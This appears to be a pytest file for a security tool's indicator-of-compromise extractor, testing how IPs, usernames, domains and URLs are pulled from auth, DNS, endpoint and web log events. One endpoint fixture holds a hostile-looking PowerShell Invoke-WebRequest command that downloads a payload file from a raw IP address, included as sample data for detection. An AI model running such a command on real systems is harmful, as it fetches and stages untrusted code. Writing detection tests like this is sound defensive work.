from datetime import UTC, datetime

from app.ioc.field_extraction import extract_from_event
from app.models.enums import IOCType, SourceType

NOW = datetime(2026, 1, 17, 12, 0, 0, tzinfo=UTC)


class TestExtractFromEvent:
    def test_auth_event_extracts_ip_and_username(self, make_event):
        event = make_event(
            SourceType.AUTH,
            NOW,
            {
                "event_result": "success",
                "username": "jdoe",
                "source_ip": "10.0.0.42",
                "dest_host": "web01.internal",
                "auth_method": "publickey",
            },
        )
        found = extract_from_event(event)
        types = {c.ioc_type for c in found}
        assert types == {IOCType.IPV4, IOCType.USERNAME}
        ip_candidate = next(c for c in found if c.ioc_type == IOCType.IPV4)
        assert ip_candidate.confidence == 1.0

    def test_dns_event_extracts_domain_and_resolved_ips(self, make_event):
        event = make_event(
            SourceType.DNS,
            NOW,
            {
                "query_name": "cdn-update-service.example",
                "query_type": "A",
                "response_code": "NOERROR",
                "resolved_ips": ["198.51.100.77", "203.0.113.9"],
                "resolver_ip": "10.0.0.2",
            },
        )
        found = extract_from_event(event)
        domains = [c for c in found if c.ioc_type == IOCType.DOMAIN]
        ips = [c for c in found if c.ioc_type == IOCType.IPV4]
        assert len(domains) == 1
        assert domains[0].value == "cdn-update-service.example"
        assert len(ips) == 2

    def test_endpoint_event_scans_command_line_and_extracts_user(self, make_event):
        event = make_event(
            SourceType.ENDPOINT,
            NOW,
            {
                "process_name": "powershell.exe",
                "command_line": 'powershell.exe -Command "Invoke-WebRequest -Uri http://185.220.101.5/p.bin"',
                "pid": 100,
                "user": "svc-backup",
            },
        )
        found = extract_from_event(event)
        types = {c.ioc_type for c in found}
        assert IOCType.USERNAME in types
        assert IOCType.URL in types
        assert IOCType.IPV4 in types

    def test_web_event_does_not_scan_user_agent(self, make_event):
        event = make_event(
            SourceType.WEB,
            NOW,
            {
                "method": "GET",
                "path": "/dashboard",
                "status_code": 200,
                "source_ip": "10.0.0.42",
                "user_agent": "curl/8.0.0 contact admin@example.com",
            },
        )
        found = extract_from_event(event)
        assert all(c.ioc_type != IOCType.EMAIL for c in found)

    def test_missing_field_is_skipped_without_error(self, make_event):
        event = make_event(
            SourceType.ENDPOINT,
            NOW,
            {"process_name": "notepad.exe", "command_line": "notepad.exe", "pid": 1},
        )
        # no "user" key at all — should not raise
        found = extract_from_event(event)
        assert all(c.ioc_type != IOCType.USERNAME for c in found)
